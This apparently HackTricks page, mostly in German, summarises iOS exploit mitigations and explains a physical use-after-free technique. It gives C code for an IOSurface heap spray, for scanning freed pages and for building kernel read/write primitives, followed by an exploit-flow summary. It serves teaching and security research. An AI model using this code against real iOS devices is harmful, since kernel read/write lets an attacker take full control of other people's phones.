# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## iOS Exploit-Schutzmaßnahmen

- **Code Signing** in iOS funktioniert, indem jedes ausführbare Stück Code (Apps, Libraries, Extensions usw.) kryptografisch mit einem von Apple ausgestellten Zertifikat signiert sein muss. Beim Laden von Code überprüft iOS die digitale Signatur gegen Apples vertrauenswürdige Root. Ist die Signatur ungültig, fehlt oder wurde verändert, verweigert das OS die Ausführung. Das verhindert, dass Angreifer bösartigen Code in legitime Apps injizieren oder unsignierte Binärdateien ausführen, und bricht damit die meisten Exploit-Ketten, die auf das Ausführen beliebigen oder manipulierten Codes angewiesen sind.
- **CoreTrust** ist das iOS-Subsystem, das die Code-Signierung zur Laufzeit durchsetzt. Es validiert Signaturen direkt mit Apples Root-Zertifikat, ohne sich auf zwischengespeicherte Trust-Stores zu verlassen. Das bedeutet, dass nur Binärdateien, die von Apple signiert sind (oder gültige Entitlements haben), ausgeführt werden können. CoreTrust stellt sicher, dass selbst wenn ein Angreifer eine App nach der Installation manipuliert, Systembibliotheken ändert oder versucht, unsignierten Code zu laden, die Ausführung blockiert wird, sofern der Code nicht korrekt signiert ist. Diese strikte Durchsetzung schließt viele Post-Exploitation-Vektoren, die ältere iOS-Versionen durch schwächere oder umgehbare Signaturprüfungen erlaubten.
- **Data Execution Prevention (DEP)** markiert Speicherbereiche als nicht ausführbar, sofern sie nicht explizit Code enthalten. Das verhindert, dass Angreifer Shellcode in Datenbereiche (wie Stack oder Heap) injizieren und ausführen; sie müssen auf kompliziertere Techniken wie ROP (Return-Oriented Programming) ausweichen.
- **ASLR (Address Space Layout Randomization)** randomisiert die Speicheradressen von Code, Libraries, Stack und Heap bei jedem Start. Das macht es deutlich schwieriger für Angreifer, vorherzusagen, wo nützliche Instruktionen oder Gadgets liegen, und zerstört viele Exploit-Ketten, die auf feste Speicherlayouts angewiesen sind.
- **KASLR (Kernel ASLR)** wendet dasselbe Randomisierungskonzept auf den iOS-Kernel an. Durch das Verschieben der Kernel-Basisadresse bei jedem Boot verhindert es, dass Angreifer verlässlich Kernel-Funktionen oder -Strukturen lokalisieren, und erhöht die Schwierigkeit von Kernel-Level-Exploits, die sonst vollständige Systemkontrolle erlangen würden.
- **Kernel Patch Protection (KPP)**, auch bekannt als **AMCC (Apple Mobile File Integrity)** in iOS, überwacht dauerhaft die Kernel-Code-Seiten, um sicherzustellen, dass sie nicht modifiziert wurden. Wenn eine Manipulation erkannt wird — etwa ein Exploit, der versucht, Kernel-Funktionen zu patchen oder bösartigen Code einzufügen — panict das Gerät sofort und startet neu. Dieser Schutz macht persistente Kernel-Exploits deutlich schwerer, da Angreifer Kernel-Instruktionen nicht einfach hooken oder patchen können, ohne einen Systemabsturz auszulösen.
- **Kernel Text Readonly Region (KTRR)** ist eine hardwarebasierte Sicherheitsfunktion, die auf iOS-Geräten eingeführt wurde. Sie nutzt den Speichercontroller der CPU, um den Code-(text)-Bereich des Kernels nach dem Boot dauerhaft als schreibgeschützt zu markieren. Einmal gesperrt, kann selbst der Kernel diesen Speicherbereich nicht mehr verändern. Das verhindert, dass Angreifer — und sogar privilegierter Code — Kernel-Instruktionen zur Laufzeit patchen, und schließt damit eine große Klasse von Exploits, die auf direkte Modifikation von Kernel-Code angewiesen waren.
- **Pointer Authentication Codes (PAC)** verwenden kryptografische Signaturen, die in ungenutzte Bits von Pointern eingebettet sind, um deren Integrität vor der Nutzung zu verifizieren. Wenn ein Pointer (z. B. eine Rücksprungadresse oder ein Funktionspointer) erstellt wird, signiert die CPU ihn mit einem geheimen Schlüssel; vor dem Dereferenzieren prüft die CPU die Signatur. Wurde der Pointer manipuliert, schlägt die Prüfung fehl und die Ausführung stoppt. Das verhindert, dass Angreifer Pointer in Memory-Corruption-Exploits fälschen oder wiederverwenden und erschwert Techniken wie ROP oder JOP erheblich.
- **Privilege Access Never (PAN)** ist eine Hardwarefunktion, die verhindert, dass der Kernel (privilegierter Modus) direkt auf User-Space-Speicher zugreift, es sei denn, er aktiviert den Zugriff explizit. Das stoppt Angreifer, die Kernel-Codeausführung erlangt haben, daran, User-Speicher einfach zu lesen oder zu schreiben, um Exploits zu eskalieren oder sensible Daten zu stehlen. Durch strikte Trennung reduziert PAN die Auswirkungen von Kernel-Exploits und blockiert viele gängige Privilege-Escalation-Techniken.
- **Page Protection Layer (PPL)** ist ein iOS-Sicherheitsmechanismus, der kritische kernelverwaltete Speicherbereiche schützt, insbesondere solche, die mit Code-Signing und Entitlements zu tun haben. Er setzt strikte Schreibschutzmaßnahmen mithilfe der MMU (Memory Management Unit) und zusätzlicher Prüfungen durch und stellt sicher, dass selbst privilegierter Kernel-Code nicht beliebig sensible Seiten ändern kann. Das verhindert, dass Angreifer mit Kernel-Level-Ausführung sicherheitskritische Strukturen manipulieren, und macht Persistenz und Code-Signing-Bypasses deutlich schwieriger.


## Physical use-after-free

This is a summary from the post from [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) moreover further information about exploit using this technique can be found in [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Speicherverwaltung in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

Der **virtuelle Adressraum** für User-Prozesse auf iOS reicht von **0x0 bis 0x8000000000**. Diese Adressen bilden jedoch nicht direkt den physischen Speicher ab. Stattdessen verwendet der **Kernel** **Seitentabellen**, um virtuelle Adressen in tatsächliche **physische Adressen** zu übersetzen.

#### Ebenen der Seitentabellen in iOS

Seitentabellen sind hierarchisch in drei Ebenen organisiert:

1. **L1 Page Table (Level 1)**:
* Jeder Eintrag repräsentiert einen großen Bereich des virtuellen Speichers.
* Er deckt **0x1000000000 Bytes** (oder **256 GB**) virtuellen Speicher ab.
2. **L2 Page Table (Level 2)**:
* Ein Eintrag hier repräsentiert eine kleinere Region virtuellen Speichers, nämlich **0x2000000 Bytes** (32 MB).
* Ein L1-Eintrag kann auf eine L2-Tabelle zeigen, wenn er den gesamten Bereich nicht selbst abbilden kann.
3. **L3 Page Table (Level 3)**:
* Dies ist die feinste Ebene, in der jeder Eintrag eine einzelne **4 KB**-Speicherseite abbildet.
* Ein L2-Eintrag kann auf eine L3-Tabelle zeigen, wenn eine feinere Kontrolle erforderlich ist.

#### Abbildung von Virtuell zu Physisch

* **Direkte Abbildung (Block Mapping)**:
* Einige Einträge in einer Seitentabelle bilden direkt einen Bereich virtueller Adressen auf einen zusammenhängenden Bereich physischer Adressen ab (wie eine Abkürzung).
* **Pointer auf Kind-Seitentabelle**:
* Wenn eine feinere Steuerung nötig ist, kann ein Eintrag auf einer Ebene (z. B. L1) auf eine **Kind-Seitentabelle** der nächsten Ebene (z. B. L2) zeigen.

#### Beispiel: Abbildung einer virtuellen Adresse

Angenommen, Sie greifen auf die virtuelle Adresse **0x1000000000** zu:

1. **L1-Tabelle**:
* Der Kernel prüft den L1-Seitentabelleneintrag, der dieser virtuellen Adresse entspricht. Wenn er einen **Pointer zu einer L2-Seitentabelle** enthält, geht er zu dieser L2-Tabelle.
2. **L2-Tabelle**:
* Der Kernel prüft die L2-Seitentabelle für eine detailliertere Abbildung. Wenn dieser Eintrag auf eine **L3-Seitentabelle** zeigt, fährt er dort fort.
3. **L3-Tabelle**:
* Der Kernel sucht den finalen L3-Eintrag, der auf die **physische Adresse** der tatsächlichen Speicherseite zeigt.

#### Beispiel für Adressabbildung

Wenn Sie die physische Adresse **0x800004000** in den ersten Index der L2-Tabelle schreiben, dann:

* Virtuelle Adressen von **0x1000000000** bis **0x1002000000** werden auf physische Adressen von **0x800004000** bis **0x802004000** abgebildet.
* Dies ist eine **Block-Abbildung** auf L2-Ebene.

Alternativ, wenn der L2-Eintrag auf eine L3-Tabelle zeigt:

* Würde jede 4 KB-Seite im virtuellen Adressbereich **0x1000000000 -> 0x1002000000** durch einzelne Einträge in der L3-Tabelle abgebildet werden.

### Physical use-after-free

Ein **physical use-after-free** (UAF) tritt auf, wenn:

1. Ein Prozess etwas Speicher als **lesbar und beschreibbar** **allociert**.
2. Die **Seitentabellen** werden aktualisiert, um diesen Speicher auf eine bestimmte physische Adresse abzubilden, auf die der Prozess zugreifen kann.
3. Der Prozess **deallociert** (freigibt) den Speicher.
4. Aufgrund eines **Bugs** vergisst der Kernel jedoch, die Abbildung aus den Seitentabellen zu entfernen, obwohl er den entsprechenden physischen Speicher als frei markiert.
5. Der Kernel kann diesen „freigegebenen“ physischen Speicher dann **wiederverwenden** (reallocieren) für andere Zwecke, z. B. **Kernel-Daten**.
6. Da die Abbildung nicht entfernt wurde, kann der Prozess weiterhin **lesen und schreiben** auf diesen physischen Speicher.

Das bedeutet, dass der Prozess **auf Kernel-Speicherseiten** zugreifen kann, die sensible Daten oder Strukturen enthalten können, und einem Angreifer potenziell erlauben, **Kernel-Speicher zu manipulieren**.

### IOSurface Heap Spray

Da der Angreifer nicht kontrollieren kann, welche spezifischen Kernel-Seiten dem freigegebenen Speicher zugewiesen werden, benutzt er eine Technik namens **heap spray**:

1. Der Angreifer **erstellt eine große Anzahl von IOSurface-Objekten** im Kernel-Speicher.
2. Jedes IOSurface-Objekt enthält einen **magic value** in einem seiner Felder, was es leicht identifizierbar macht.
3. Sie **scannen die freigegebenen Seiten**, um zu prüfen, ob eines dieser IOSurface-Objekte auf einer freigegebenen Seite gelandet ist.
4. Wenn sie ein IOSurface-Objekt auf einer freigegebenen Seite finden, können sie es verwenden, um **Kernel-Speicher zu lesen und zu schreiben**.

Mehr Informationen dazu in [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Beachte, dass iOS 16+ (A12+) Geräte hardwarebasierte Schutzmaßnahmen (wie PPL oder SPTM) einführen, die physical UAF-Techniken deutlich weniger praktikabel machen.
> PPL erzwingt strikte MMU-Schutzmechanismen für Seiten, die mit Code-Signing, Entitlements und sensiblen Kernel-Daten zusammenhängen; selbst wenn eine Seite wiederverwendet wird, werden Schreibzugriffe aus Userland oder kompromittiertem Kernel-Code auf PPL-geschützte Seiten blockiert.
> Secure Page Table Monitor (SPTM) erweitert PPL, indem es Seitentabellen-Updates selbst härtert. Es stellt sicher, dass selbst privilegierter Kernel-Code nicht stillschweigend freigegebene Seiten remappen oder Abbildungen manipulieren kann, ohne sichere Prüfungen zu durchlaufen.
> KTRR (Kernel Text Read-Only Region) sperrt den Code-Bereich des Kernels nach dem Boot als schreibgeschützt. Das verhindert jegliche Laufzeit-Modifikationen am Kernel-Code und schließt damit einen großen Angriffsvektor, auf den physical UAF-Exploits oft angewiesen sind.
> Darüber hinaus sind `IOSurface`-Allokationen weniger vorhersehbar und schwerer in benutzerzugängliche Regionen zu mappen, was den „Magic Value“-Scan-Trick deutlich unzuverlässiger macht. Und `IOSurface` wird mittlerweile durch Entitlements und Sandbox-Beschränkungen geschützt.

### Schritt-für-Schritt Heap Spray-Prozess

1. **Spray IOSurface Objects**: Der Angreifer erstellt viele IOSurface-Objekte mit einem speziellen Identifikator ("magic value").
2. **Scan Freed Pages**: Sie prüfen, ob eines der Objekte auf einer freigegebenen Seite alloziert wurde.
3. **Read/Write Kernel Memory**: Durch Manipulation von Feldern im IOSurface-Objekt erhalten sie die Möglichkeit, **beliebige Reads und Writes** im Kernel-Speicher durchzuführen. Dies erlaubt ihnen:
* Ein Feld zu verwenden, um **beliebige 32-Bit-Werte** im Kernel-Speicher zu lesen.
* Ein anderes Feld zu verwenden, um **64-Bit-Werte zu schreiben**, wodurch ein stabiler **Kernel read/write primitive** entsteht.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Suche nach **`IOSurface`**-Objekten in einer freigegebenen physischen Seite:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Erreichen von Kernel-Lese-/Schreibzugriff mit IOSurface

Nachdem Kontrolle über ein IOSurface-Objekt im Kernel-Speicher (auf eine freigegebene physische Seite gemappt, die aus dem userspace zugreifbar ist) erlangt wurde, können wir es für **beliebige Kernel-Lese- und Schreiboperationen** verwenden.

**Key Fields in IOSurface**

Das IOSurface-Objekt hat zwei entscheidende Felder:

1. **Use Count Pointer**: Ermöglicht einen **32-bit read**.
2. **Indexed Timestamp Pointer**: Ermöglicht einen **64-bit write**.

Durch Überschreiben dieser Pointer leiten wir sie auf beliebige Adressen im Kernel-Speicher um und ermöglichen so Lese-/Schreibfähigkeiten.

#### 32-Bit Kernel-Lesezugriff

Um einen Lesezugriff durchzuführen:

1. Überschreibe den **use count pointer**, sodass er auf die Zieladresse minus einem 0x14-Byte-Offset zeigt.
2. Verwende die Methode `get_use_count`, um den Wert an dieser Adresse auszulesen.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel-Schreibvorgang

Um einen Schreibvorgang durchzuführen:

1. Überschreibe den **Pointer für den indexierten Zeitstempel** mit der Zieladresse.
2. Verwende die Methode `set_indexed_timestamp`, um einen 64-Bit-Wert zu schreiben.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit-Ablauf (Zusammenfassung)

1. **Trigger Physical Use-After-Free**: Freigegebene Seiten stehen zur Wiederverwendung zur Verfügung.
2. **Spray IOSurface Objects**: Weise viele IOSurface-Objekte mit einem eindeutigen "magic value" im Kernel-Speicher zu.
3. **Identify Accessible IOSurface**: Finde ein IOSurface auf einer freigegebenen Seite, die du kontrollierst.
4. **Abuse Use-After-Free**: Ändere Pointer im IOSurface-Objekt, um beliebige **kernel read/write** über IOSurface-Methoden zu ermöglichen.

Mit diesen Primitiven liefert der Exploit kontrollierte **32-bit reads** und **64-bit writes** im Kernel-Speicher. Weitere jailbreak-Schritte könnten stabilere read/write-Primitiven erfordern, die das Umgehen zusätzlicher Schutzmechanismen (z. B. PPL auf neueren arm64e-Geräten) notwendig machen.

{{#include ../../banners/hacktricks-training.md}}
